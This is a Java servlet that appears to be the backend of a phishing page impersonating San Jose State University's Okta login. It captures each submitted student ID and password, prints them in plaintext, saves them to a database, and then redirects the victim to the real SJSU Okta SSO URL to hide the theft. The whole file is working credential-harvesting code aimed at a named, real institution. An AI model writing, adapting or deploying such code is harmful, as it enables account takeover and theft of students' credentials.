package com.example.demo;

import jakarta.servlet.RequestDispatcher;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.*;
import com.example.demo.DatabaseConnection;
import java.sql.SQLException;

@WebServlet("/sjsu.okta.com")
public class Servlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        //Retrieve login info from testing.jsp
        String studentID = req.getParameter("identifier");
        String password = req.getParameter("credentials.passcode");
        
        System.out.println("studentID: " + studentID);
        System.out.println("password: " + password);

        Bean bean = new Bean(studentID, password);
        int validation = 0;
        try {
            validation = bean.store();
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }

        System.out.println("validation: " + validation);
        System.out.println("Redirecting to real sjsu.okta.com");
//        req.getRequestDispatcher("https://sjsu.okta.com/app/sanjosestateuniversity_psghcampussolutions_1/exkk56vvg5sVa0tkH0x7/sso/saml");
        resp.sendRedirect("https://sjsu.okta.com/app/sanjosestateuniversity_psghcampussolutions_1/exkk56vvg5sVa0tkH0x7/sso/saml");
    }

    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.getRequestDispatcher("testing.jsp").forward(req, resp);
    }
}
